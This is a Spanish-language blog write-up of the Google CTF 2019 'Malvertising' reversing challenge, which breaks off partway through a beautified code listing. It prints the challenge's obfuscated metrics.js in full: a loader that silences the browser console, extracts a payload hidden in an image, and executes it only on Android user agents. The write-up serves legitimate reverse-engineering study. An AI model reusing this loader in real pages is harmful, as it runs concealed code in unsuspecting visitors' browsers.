<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>Google CTF 2019 - Malvertising - xbytemx</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="Tony Palma" /><meta name="description" content="Malware embebido en una imagen, droppeado por condiciones especificas en el navegador" />







<meta name="generator" content="Hugo 0.54.0" />


<link rel="canonical" href="https://xbytemx.github.io/post/gctf2019_-_malvertising/" />

<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">







<link href="/dist/even.min.css?v=3.2.0" rel="stylesheet">
<link href="/lib/fancybox/jquery.fancybox-3.1.20.min.css" rel="stylesheet">




<meta property="og:title" content="Google CTF 2019 - Malvertising" />
<meta property="og:description" content="Malware embebido en una imagen, droppeado por condiciones especificas en el navegador" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://xbytemx.github.io/post/gctf2019_-_malvertising/" />
<meta property="article:published_time" content="2019-07-06T20:21:09-05:00"/>
<meta property="article:modified_time" content="2019-07-06T20:21:09-05:00"/><meta property="og:site_name" content="xbytemx" />

<meta itemprop="name" content="Google CTF 2019 - Malvertising">
<meta itemprop="description" content="Malware embebido en una imagen, droppeado por condiciones especificas en el navegador">


<meta itemprop="datePublished" content="2019-07-06T20:21:09-05:00" />
<meta itemprop="dateModified" content="2019-07-06T20:21:09-05:00" />
<meta itemprop="wordCount" content="3652">



<meta itemprop="keywords" content="ctf,mayas,googlectf2019,javascript,malware," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Google CTF 2019 - Malvertising"/>
<meta name="twitter:description" content="Malware embebido en una imagen, droppeado por condiciones especificas en el navegador"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">xbytemx</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">Categories</li>
      </a>
  </ul>
</nav>
  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">xbytemx</a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/categories/">Categories</a>
      </li>
  </ul>
</nav>
    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">Google CTF 2019 - Malvertising</h1>

      <div class="post-meta">
        <span class="post-time"> 2019-07-06 </span>
        <div class="post-category">
            
              <a href="/categories/reversing/"> reversing </a>
            
              <a href="/categories/ctf/"> ctf </a>
            
          </div>
        <span class="more-meta"> 3652 words </span>
        <span class="more-meta"> 18 mins read </span>
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Contents</h2>
  
  <div class="post-toc-content always-active">
    
  </div>
</div>

    
    

    
    <div class="post-content">
      <p>Este fue mi primer reto en realizar en el Google CTF y tengo que decir que a pesar de verlo mas sencillo en retrospectiva, cuando lo realice fue un dolor de muela.</p>

<p>Básicamente es código en javascript ofuscado, que se vale de varias condiciones del navegador para poder ejecutar diferentes capas de la cebolla.</p>

<p>El reto unicamente nos da una URL para que trabajemos, la cual es la siguiente:</p>

<p><a href="https://malvertising.web.ctfcompetition.com/">https://malvertising.web.ctfcompetition.com/</a></p>

<p>Al ingresar, veremos en el <em>title</em> dice Youtube y en el contenido tenemos algo muy parecido a Youtube:</p>

<p><img src="/img/gctf2019/home.png" alt="Home del reto" /></p>

<p>Pronto veremos que al analizar el código, esto se trataba de una imagen. Al revisar el código vía <code>httpie</code> tenemos:</p>

<pre><code>xbytemx@laptop:~$ http https://malvertising.web.ctfcompetition.com/
HTTP/1.1 200 OK
Age: 4
Cache-Control: public, max-age=43200
Content-Encoding: gzip
Content-Length: 312
Content-Type: text/html; charset=utf-8
Date: Sun, 07 Jul 2019 01:44:01 GMT
ETag: W/&quot;1560272683.0-435-1164904229&quot;
Expires: Sun, 07 Jul 2019 13:44:01 GMT
Last-Modified: Tue, 11 Jun 2019 17:04:43 GMT
Server: Google Frontend
Vary: Accept-Encoding
X-Cloud-Trace-Context: 3acd7256f58e1d07c53dd9da501cb7f0

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;meta charset=&quot;utf-8&quot;/&gt;
&lt;head&gt;
  &lt;title&gt;Youtube&lt;/title&gt;
  &lt;style&gt;
  body {
          background-image: url(&quot;bg.png&quot;);
          background-repeat: no-repeat;
  }
  div{
    position: absolute;
    top: 7%;
    left: 25%;

    width: 100px;
    height: 100px;
  }​
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div&gt;
&lt;iframe src=&quot;ads/ad.html&quot; width=&quot;852&quot; height=&quot;239&quot; frameBorder=&quot;0&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>Como podemos ver, en background-image se declara una imagen gigante que copia a Youtube:</p>

<pre><code>xbytemx@laptop:~$ wget https://malvertising.web.ctfcompetition.com/bg.png -O bg.png
--2019-07-06 20:45:37--  https://malvertising.web.ctfcompetition.com/bg.png
Resolviendo malvertising.web.ctfcompetition.com (malvertising.web.ctfcompetition.com)... 172.217.3.83, 2607:f8b0:4008:811::2013
Conectando con malvertising.web.ctfcompetition.com (malvertising.web.ctfcompetition.com)[172.217.3.83]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1154852 (1.1M) [image/png]
Grabando a: “bg.png”

bg.png   100%[============================================================&gt;]   1.10M  1.46MB/s    en 0.8s

2019-07-06 20:45:38 (1.46 MB/s) - “bg.png” guardado [1154852/1154852]

xbytemx@laptop:~$ exiftool bg.png
ExifTool Version Number         : 11.16
File Name                       : bg.png
Directory                       : gctf2019
File Size                       : 1128 kB
File Modification Date/Time     : 2019:06:11 12:04:43-05:00
File Access Date/Time           : 2019:07:06 20:45:38-05:00
File Inode Change Date/Time     : 2019:07:06 20:45:38-05:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1920
Image Height                    : 1079
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Exif Byte Order                 : Little-endian (Intel, II)
Bits Per Sample                 : 8 8 8
X Resolution                    : 300
Y Resolution                    : 300
Resolution Unit                 : inches
Software                        : GIMP 2.10.8
Photometric Interpretation      : YCbCr
Samples Per Pixel               : 3
Thumbnail Offset                : 272
Thumbnail Length                : 7496
Background Color                : 0 0 0
Pixels Per Unit X               : 11811
Pixels Per Unit Y               : 11811
Pixel Units                     : meters
Modify Date                     : 2019:04:16 15:15:30
Image Size                      : 1920x1079
Megapixels                      : 2.1
Thumbnail Image                 : (Binary data 7496 bytes, use -b option to extract)
</code></pre>

<p>Por supuesto luce muy parecido, solo que le falta algo:</p>

<p><img src="/img/gctf2019/bg.png" alt="Home del reto" /></p>

<p>Ese elemento faltante es el iframe que se declara: <code>&lt;iframe src=&quot;ads/ad.html&quot; width=&quot;852&quot; height=&quot;239&quot; frameBorder=&quot;0&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;</code></p>

<p>Asi que veamos que tenemos dentro de ad.html:</p>

<p><img src="/img/gctf2019/ad.png" alt="ad.html en ads" /></p>

<p>Si hacemos la petición por <code>httpie</code>:</p>

<pre><code>xbytemx@laptop:~$ http https://malvertising.web.ctfcompetition.com/ads/ad.html
HTTP/1.1 200 OK
Cache-Control: public, max-age=43200
Content-Encoding: gzip
Content-Length: 689
Content-Type: text/html; charset=utf-8
Date: Sun, 07 Jul 2019 01:48:54 GMT
ETag: W/&quot;1560272683.0-1537-1250101049&quot;
Expires: Sun, 07 Jul 2019 13:48:54 GMT
Last-Modified: Tue, 11 Jun 2019 17:04:43 GMT
Server: Google Frontend
Vary: Accept-Encoding
X-Cloud-Trace-Context: bf976ba48afa775be30e41f6a39f5667;o=1

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;meta charset=&quot;utf-8&quot;/&gt;
  &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
  &lt;meta content=&quot;IE=Edge&quot; http-equiv=&quot;X-UA-Compatible&quot;&gt;
  &lt;meta content=&quot;width=852,height=239&quot; name=&quot;ad.size&quot;&gt;
  &lt;title&gt;ad&lt;/title&gt;
&lt;/head&gt;
&lt;style&gt;
  body {
          background-image: url(&quot;./src/852x239.png&quot;);
          background-repeat: no-repeat;
          height: 100%;
          margin: 0;
          padding: 50px 0;
          font: 50px Helvetica, sans-serif;
          color: #FFFFFF;
          text-align: center;
  }
&lt;/style&gt;
&lt;body&gt;
&lt;div&gt;
  &lt;img border=0 height=0 id=adimg src=&quot;./src/852x239.png&quot; width=0&gt;
  &quot;Your advertisement here&quot;
&lt;/div&gt;
&lt;script&gt;
  function click() {
    window.top.location.href = &quot;http://www.google.com&quot;;
  }
  document.addEventListener(&quot;click&quot;, click)
&lt;/script&gt;
&lt;script id=&quot;adjs&quot; src=&quot;./src/metrics.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;img width=1 height=1 src=&quot;./src/apY7ERVvTFvgbHPbDwSC/1x1.png&quot;&gt;
&lt;img style=&quot;visibility:hidden;display:none;&quot; height=&quot;1&quot; width=&quot;1&quot; /&gt;
&lt;iframe src=&quot;bh/drts.png?drts=110322201473&quot; height=&quot;1&quot; width=&quot;1&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; marginheight=&quot;0&quot; marginwidth=&quot;0&quot; allowtransparency=&quot;true&quot;&gt;
&lt;/iframe&gt;
&lt;iframe src=&quot;bh/drts.png?drts=120322201473&quot; height=&quot;1&quot; width=&quot;1&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; marginheight=&quot;0&quot; marginwidth=&quot;0&quot; allowtransparency=&quot;true&quot;&gt;
&lt;/iframe&gt;
&lt;iframe src=&quot;bh/drts.png?drts=130322201473&quot; height=&quot;1&quot; width=&quot;1&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; marginheight=&quot;0&quot; marginwidth=&quot;0&quot; allowtransparency=&quot;true&quot;&gt;
&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>Vemos que tenemos un script de JavaScript que al tener un evento de click en el documento, cambia el header Location hacia google.com. También vemos la imagen de un puerquito con el titular de &ldquo;tu publicidad aqui&rdquo;</p>

<p>Tambien tenemos un script que se importa via src llamado metrics en una carpeta nueva llamada src. Esta se encuentra en <code>/ads/src</code>.</p>

<p>Si descargamos el script metrics.js, este es su contenido:</p>

<pre><code class="language-javascript">!function(a,b,c){&quot;undefined&quot;!=typeof module&amp;&amp;module.exports?module.exports=c():&quot;function&quot;==typeof define&amp;&amp;define.amd?define(c):b[a]=c()}(&quot;steg&quot;,this,function(){var a=function(){},b={isPrime:function(a){if(isNaN(a)||!isFinite(a)||a%1||2&gt;a)return!1;if(a%2===0)return 2===a;if(a%3===0)return 3===a;for(var b=Math.sqrt(a),c=5;b&gt;=c;c+=6){if(a%c===0)return!1;if(a%(c+2)===0)return!1}return!0},findNextPrime:function(a){for(var c=a;!0;c+=1)if(b.isPrime(c))return c},sum:function(a,b,c){var d=0;c=c||{};for(var e=c.start||0;b&gt;e;e+=c.inc||1)d+=a(e)||0;return 0===d&amp;&amp;c.defValue?c.defValue:d},product:function(a,b,c){var d=1;c=c||{};for(var e=c.start||0;b&gt;e;e+=c.inc||1)d*=a(e)||1;return 1===d&amp;&amp;c.defValue?c.defValue:d},createArrayFromArgs:function(a,b,c){for(var d=new Array(c-1),e=0;c&gt;e;e+=1)d[e]=a(e&gt;=b?e+1:e);return d},loadImg:function(a){var b=new Image;return b.src=a,b}};return a.prototype.config={t:3,threshold:1,codeUnitSize:16,args:function(a){return a+1},messageDelimiter:function(a,b){for(var c=new Array(3*b),d=0;d&lt;c.length;d+=1)c[d]=255;return c},messageCompleted:function(a,b,c){for(var d=!0,e=0;16&gt;e&amp;&amp;d;e+=1)d=d&amp;&amp;255===a[b+4*e];return d}},a.prototype.getHidingCapacity=function(a,b){b=b||{};var c=this.config,d=b.width||a.width,e=b.height||a.height,f=b.t||c.t,g=b.codeUnitSize||c.codeUnitSize;return f*d*e/g&gt;&gt;0},a.prototype.encode=function(a,c,d){if(c.length)c=b.loadImg(c);else if(c.src)c=b.loadImg(c.src);else if(!(c instanceof HTMLImageElement))throw new Error(&quot;IllegalInput: The input image is neither an URL string nor an image.&quot;);d=d||{};var e=this.config,f=d.t||e.t,g=d.threshold||e.threshold,h=d.codeUnitSize||e.codeUnitSize,i=b.findNextPrime(Math.pow(2,f)),j=d.args||e.args,k=d.messageDelimiter||e.messageDelimiter;if(!f||1&gt;f||f&gt;7)throw new Error('IllegalOptions: Parameter t = &quot; + t + &quot; is not valid: 0 &lt; t &lt; 8');var l=document.createElement(&quot;canvas&quot;),m=l.getContext(&quot;2d&quot;);l.style.display=&quot;none&quot;,l.width=d.width||c.width,l.height=d.height||c.height,d.height&amp;&amp;d.width?m.drawImage(c,0,0,d.width,d.height):m.drawImage(c,0,0);var n,o,p,q,r,s,t,u,v,w,x=m.getImageData(0,0,l.width,l.height),y=x.data,z=h/f&gt;&gt;0,A=h%f,B=[];for(v=0;v&lt;=a.length;v+=1){if(s=a.charCodeAt(v)||0,t=A*v%f,t&gt;0&amp;&amp;o){if(u=Math.pow(2,f-t)-1,p=Math.pow(2,h)*(1-Math.pow(2,-t)),q=(s&amp;u)&lt;&lt;t,r=(o&amp;p)&gt;&gt;h-t,B.push(q+r),v&lt;a.length){for(u=Math.pow(2,2*f-t)*(1-Math.pow(2,-f)),w=1;z&gt;w;w+=1)n=s&amp;u,B.push(n&gt;&gt;(w-1)*f+(f-t)),u&lt;&lt;=f;A*(v+1)%f===0?(u=Math.pow(2,h)*(1-Math.pow(2,-f)),n=s&amp;u,B.push(n&gt;&gt;h-f)):f&gt;=A*(v+1)%f+(f-t)&amp;&amp;(n=s&amp;u,B.push(n&gt;&gt;(z-1)*f+(f-t)))}}else if(v&lt;a.length)for(u=Math.pow(2,f)-1,w=0;z&gt;w;w+=1)n=s&amp;u,B.push(n&gt;&gt;w*f),u&lt;&lt;=f;o=s}var C,D,E,F,G,H=k(B,g);for(C=0;4*(C+g)&lt;=y.length&amp;&amp;C+g&lt;=B.length;C+=g){for(G=[],v=0;g&gt;v&amp;&amp;v+C&lt;B.length;v+=1){for(F=0,w=C;g+C&gt;w&amp;&amp;w&lt;B.length;w+=1)F+=B[w]*Math.pow(j(v),w-C);G[v]=255-i+1+F%i}for(v=4*C;v&lt;4*(C+G.length)&amp;&amp;v&lt;y.length;v+=4)y[v+3]=G[v/4%g];E=G.length}for(D=C+E;D-(C+E)&lt;H.length&amp;&amp;4*(C+H.length)&lt;y.length;D+=1)y[4*D+3]=H[D-(C+E)];for(v=4*(D+1)+3;v&lt;y.length;v+=4)y[v]=255;return x.data=y,m.putImageData(x,0,0),l.toDataURL()},a.prototype.decode=function(a,c){if(a.length)a=b.loadImg(a);else if(a.src)a=b.loadImg(a.src);else if(!(a instanceof HTMLImageElement))throw new Error(&quot;IllegalInput: The input image is neither an URL string nor an image.&quot;);c=c||{};var d=this.config,e=c.t||d.t,f=c.threshold||d.threshold,g=c.codeUnitSize||d.codeUnitSize,h=b.findNextPrime(Math.pow(2,e)),i=(c.args||d.args,c.messageCompleted||d.messageCompleted);if(!e||1&gt;e||e&gt;7)throw new Error('IllegalOptions: Parameter t = &quot; + t + &quot; is not valid: 0 &lt; t &lt; 8');var j=document.createElement(&quot;canvas&quot;),k=j.getContext(&quot;2d&quot;);j.style.display=&quot;none&quot;,j.width=c.width||a.width,j.height=c.width||a.height,c.height&amp;&amp;c.width?k.drawImage(a,0,0,c.width,c.height):k.drawImage(a,0,0);var l,m,n=k.getImageData(0,0,j.width,j.height),o=n.data,p=[];if(1===f)for(l=3,m=!1;!m&amp;&amp;l&lt;o.length&amp;&amp;!m;l+=4)m=i(o,l,f),m||p.push(o[l]-(255-h+1));var q=&quot;&quot;,r=0,s=0,t=Math.pow(2,g)-1;for(l=0;l&lt;p.length;l+=1)r+=p[l]&lt;&lt;s,s+=e,s&gt;=g&amp;&amp;(q+=String.fromCharCode(r&amp;t),s%=g,r=p[l]&gt;&gt;e-s);return 0!==r&amp;&amp;(q+=String.fromCharCode(r&amp;t)),q},new a});var a=['OcOOcmwqwqcOw6YY','LMO2woLDi27CscKE','w6AZw5DDkMKK','wpLDvMKTcwEBNmLCpCEC','wooTw4LDtENeT8ODfMOMGDJCLA==','wp3DgHV6UA==','IMO3woDDl2DCuQ==','SsKQw4ozw4pp','JyTCtcOi','DAwvMsKuw5YFcE8=','P8ORRsKNwoE=','UMONw7HCpyNQwoLDnynCksKLJV7CsMKAw6/Dv2PCuw==','wofDmTJ0WMOdT3zDoMKcwqzDrRoCwpBPwrBBwoxewqtMwrB7DADDlGoLw7HCpMO7','P8OZf3o1wr8C','w63CmjrCmlLDoMKN','w6LCmjM=','w6MKw4PDnQ==','w6rCkDbCnFo=','woQYw5DDng==','wrnDsMOHJsOYKcKWw4LDoQ==','w4R+wq12wqo=','GhAkM8KAw50F','wpLDvMKTcxofJg==','w59uw4R0','UsKJAgtYw6Q0','w5jCmXlB','w5pZesOQFRfDlQ==','w5DDhcKywpXCqA==','w4HDjyUaDsO6wpM='];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};var g=function(){var h={'data':{'key':'cookie','value':'timeout'},'setCookie':function(i,j,k,l){l=l||{};var m=j+'='+k;var n=0x0;for(var n=0x0,p=i['length'];n&lt;p;n++){var q=i[n];m+=';\x20'+q;var r=i[q];i['push'](r);p=i['length'];if(r!==!![]){m+='='+r;}}l['cookie']=m;},'removeCookie':function(){return'dev';},'getCookie':function(s,t){s=s||function(u){return u;};var v=s(new RegExp('(?:^|;\x20)'+t['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var w=function(x,y){x(++y);};w(e,d);return v?decodeURIComponent(v[0x1]):undefined;}};var z=function(){var A=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return A['test'](h['removeCookie']['toString']());};h['updateCookie']=z;var B='';var C=h['updateCookie']();if(!C){h['setCookie'](['*'],'counter',0x1);}else if(C){B=h['getCookie'](null,'counter');}else{h['removeCookie']();}};g();}(a,0x7e));var b=function(c,d){c=c-0x0;var e=a[c];if(b['KPKLDH']===undefined){(function(){var f;try{var g=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');f=g();}catch(h){f=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';f['atob']||(f['atob']=function(j){var k=String(j)['replace'](/=+$/,'');for(var l=0x0,m,n,o=0x0,p='';n=k['charAt'](o++);~n&amp;&amp;(m=l%0x4?m*0x40+n:n,l++%0x4)?p+=String['fromCharCode'](0xff&amp;m&gt;&gt;(-0x2*l&amp;0x6)):0x0){n=i['indexOf'](n);}return p;});}());var q=function(r,d){var t=[],u=0x0,v,w='',x='';r=atob(r);for(var y=0x0,z=r['length'];y&lt;z;y++){x+='%'+('00'+r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);}r=decodeURIComponent(x);for(var A=0x0;A&lt;0x100;A++){t[A]=A;}for(A=0x0;A&lt;0x100;A++){u=(u+t[A]+d['charCodeAt'](A%d['length']))%0x100;v=t[A];t[A]=t[u];t[u]=v;}A=0x0;u=0x0;for(var B=0x0;B&lt;r['length'];B++){A=(A+0x1)%0x100;u=(u+t[A])%0x100;v=t[A];t[A]=t[u];t[u]=v;w+=String['fromCharCode'](r['charCodeAt'](B)^t[(t[A]+t[u])%0x100]);}return w;};b['sSGzQw']=q;b['UvyfIT']={};b['KPKLDH']=!![];}var C=b['UvyfIT'][c];if(C===undefined){if(b['osjREl']===undefined){var D=function(E){this['yhuGjs']=E;this['RSLhQn']=[0x1,0x0,0x0];this['JWTCiF']=function(){return'newState';};this['uxuAZy']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['pyeOIT']='[\x27|\x22].+[\x27|\x22];?\x20*}';};D['prototype']['ijHoQZ']=function(){var F=new RegExp(this['uxuAZy']+this['pyeOIT']);var G=F['test'](this['JWTCiF']['toString']())?--this['RSLhQn'][0x1]:--this['RSLhQn'][0x0];return this['EwWlht'](G);};D['prototype']['EwWlht']=function(H){if(!Boolean(~H)){return H;}return this['cJhJoi'](this['yhuGjs']);};D['prototype']['cJhJoi']=function(I){for(var J=0x0,K=this['RSLhQn']['length'];J&lt;K;J++){this['RSLhQn']['push'](Math['round'](Math['random']()));K=this['RSLhQn']['length'];}return I(this['RSLhQn'][0x0]);};new D(b)['ijHoQZ']();b['osjREl']=!![];}e=b['sSGzQw'](e,d);b['UvyfIT'][c]=e;}else{e=C;}return e;};var d=function(){var c=!![];return function(d,e){var f=c?function(){if(e){var g=e['apply'](d,arguments);e=null;return g;}}:function(){};c=![];return f;};}();var w=d(this,function(){var c=function(){return'\x64\x65\x76';},d=function(){return'\x77\x69\x6e\x64\x6f\x77';};var e=function(){var f=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!f['\x74\x65\x73\x74'](c['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var g=function(){var h=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return h['\x74\x65\x73\x74'](d['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var i=function(j){var k=~-0x1&gt;&gt;0x1+0xff%0x0;if(j['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===k)){l(j);}};var l=function(m){var n=~-0x4&gt;&gt;0x1+0xff%0x0;if(m['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==n){i(m);}};if(!e()){if(!g()){i('\x69\x6e\x64\u0435\x78\x4f\x66');}else{i('\x69\x6e\x64\x65\x78\x4f\x66');}}else{i('\x69\x6e\x64\u0435\x78\x4f\x66');}});w();var f=function(){var g=!![];return function(h,i){var j=g?function(){if(i){var k=i[b('0x0','Kb10')](h,arguments);i=null;return k;}}:function(){};g=![];return j;};}();var l=f(this,function(){var m=function(){};var n;try{var o=Function(b('0x1',')ID3')+b('0x2','3hyK')+');');n=o();}catch(p){n=window;}if(!n[b('0x3','^aQK')]){n[b('0x4','bxQ9')]=function(m){var f={};f[b('0x5','bxQ9')]=m;f[b('0x6','vH0t')]=m;f[b('0x7','bxQ9')]=m;f[b('0x8','jAUm')]=m;f['error']=m;f[b('0x9','SF81')]=m;f[b('0xa','$KuR')]=m;return f;}(m);}else{n[b('0xb','IfD@')]['log']=m;n[b('0xc','%RuL')][b('0xd','e9PJ')]=m;n[b('0xe','(fcQ')]['debug']=m;n['console'][b('0xf','xBPx')]=m;n[b('0x10','yDXL')][b('0x11','IDtv')]=m;n[b('0x12','oBBn')][b('0x13','^aQK')]=m;n[b('0x14','F#*Z')][b('0x15','vH0t')]=m;}});l();var s=b('0x16','%RuL');var t=document[b('0x17','jAUm')](b('0x18','3hyK'));t[b('0x19','F#*Z')]=function(){try{var u=steg[b('0x1a','OfTH')](t);}catch(v){}if(Number(/\x61\x6e\x64\x72\x6f\x69\x64/i[b('0x1b','JQ&amp;l')](navigator[b('0x1c','IfD@')]))){s[s][s](u)();}};
</code></pre>

<p>Este es un javascript que pareciera tener mucha ofuscación. Si ejecutamos algún beautifier tenemos:</p>

<pre><code class="language-javascript">! function(a, b, c) {
  &quot;undefined&quot; != typeof module &amp;&amp; module.exports ? module.exports = c() : &quot;function&quot; == typeof define &amp;&amp; define.amd ? define(c) : b[a] = c()
}(&quot;steg&quot;, this, function() {
  var a = function() {},
    b = {
      isPrime: function(a) {
        if (isNaN(a) || !isFinite(a) || a % 1 || 2 &gt; a) return !1;
        if (a % 2 === 0) return 2 === a;
        if (a % 3 === 0) return 3 === a;
        for (var b = Math.sqrt(a), c = 5; b &gt;= c; c += 6) {
          if (a % c === 0) return !1;
          if (a % (c + 2) === 0) return !1
        }
        return !0
      },
      findNextPrime: function(a) {
        for (var c = a; !0; c += 1)
          if (b.isPrime(c)) return c
      },
      sum: function(a, b, c) {
        var d = 0;
        c = c || {};
        for (var e = c.start || 0; b &gt; e; e += c.inc || 1) d += a(e) || 0;
        return 0 === d &amp;&amp; c.defValue ? c.defValue : d
      },
      product: function(a, b, c) {
        var d = 1;
        c = c || {};
        for (var e = c.start || 0; b &gt; e; e += c.inc || 1) d *= a(e) || 1;
        return 1 === d &amp;&amp; c.defValue ? c.defValue : d
      },
      createArrayFromArgs: function(a, b, c) {
        for (var d = new Array(c - 1), e = 0; c &gt; e; e += 1) d[e] = a(e &gt;= b ? e + 1 : e);
        return d
      },
      loadImg: function(a) {
        var b = new Image;
        return b.src = a, b
      }
    };
  return a.prototype.config = {
    t: 3,
    threshold: 1,
    codeUnitSize: 16,
    args: function(a) {
      return a + 1
    },
    messageDelimiter: function(a, b) {
      for (var c = new Array(3 * b), d = 0; d &lt; c.length; d += 1) c[d] = 255;
      return c
    },
    messageCompleted: function(a, b, c) {
      for (var d = !0, e = 0; 16 &gt; e &amp;&amp; d; e += 1) d = d &amp;&amp; 255 === a[b + 4 * e];
      return d
    }
  }, a.prototype.getHidingCapacity = function(a, b) {
    b = b || {};
    var c = this.config,
      d = b.width || a.width,
      e = b.height || a.height,
      f = b.t || c.t,
      g = b.codeUnitSize || c.codeUnitSize;
    return f * d * e / g &gt;&gt; 0
  }, a.prototype.encode = function(a, c, d) {
    if (c.length) c = b.loadImg(c);
    else if (c.src) c = b.loadImg(c.src);
    else if (!(c instanceof HTMLImageElement)) throw new Error(&quot;IllegalInput: The input image is neither an URL string nor an image.&quot;);
    d = d || {};
    var e = this.config,
      f = d.t || e.t,
      g = d.threshold || e.threshold,
      h = d.codeUnitSize || e.codeUnitSize,
      i = b.findNextPrime(Math.pow(2, f)),
      j = d.args || e.args,
      k = d.messageDelimiter || e.messageDelimiter;
    if (!f || 1 &gt; f || f &gt; 7) throw new Error('IllegalOptions: Parameter t = &quot; + t + &quot; is not valid: 0 &lt; t &lt; 8');
    var l = document.createElement(&quot;canvas&quot;),
      m = l.getContext(&quot;2d&quot;);
    l.style.display = &quot;none&quot;, l.width = d.width || c.width, l.height = d.height || c.height, d.height &amp;&amp; d.width ? m.drawImage(c, 0, 0, d.width, d.height) : m.drawImage(c, 0, 0);
    var n, o, p, q, r, s, t, u, v, w, x = m.getImageData(0, 0, l.width, l.height),
      y = x.data,
      z = h / f &gt;&gt; 0,
      A = h % f,
      B = [];
    for (v = 0; v &lt;= a.length; v += 1) {
      if (s = a.charCodeAt(v) || 0, t = A * v % f, t &gt; 0 &amp;&amp; o) {
        if (u = Math.pow(2, f - t) - 1, p = Math.pow(2, h) * (1 - Math.pow(2, -t)), q = (s &amp; u) &lt;&lt; t, r = (o &amp; p) &gt;&gt; h - t, B.push(q + r), v &lt; a.length) {
          for (u = Math.pow(2, 2 * f - t) * (1 - Math.pow(2, -f)), w = 1; z &gt; w; w += 1) n = s &amp; u, B.push(n &gt;&gt; (w - 1) * f + (f - t)), u &lt;&lt;= f;
          A * (v + 1) % f === 0 ? (u = Math.pow(2, h) * (1 - Math.pow(2, -f)), n = s &amp; u, B.push(n &gt;&gt; h - f)) : f &gt;= A * (v + 1) % f + (f - t) &amp;&amp; (n = s &amp; u, B.push(n &gt;&gt; (z - 1) * f + (f - t)))
        }
      } else if (v &lt; a.length)
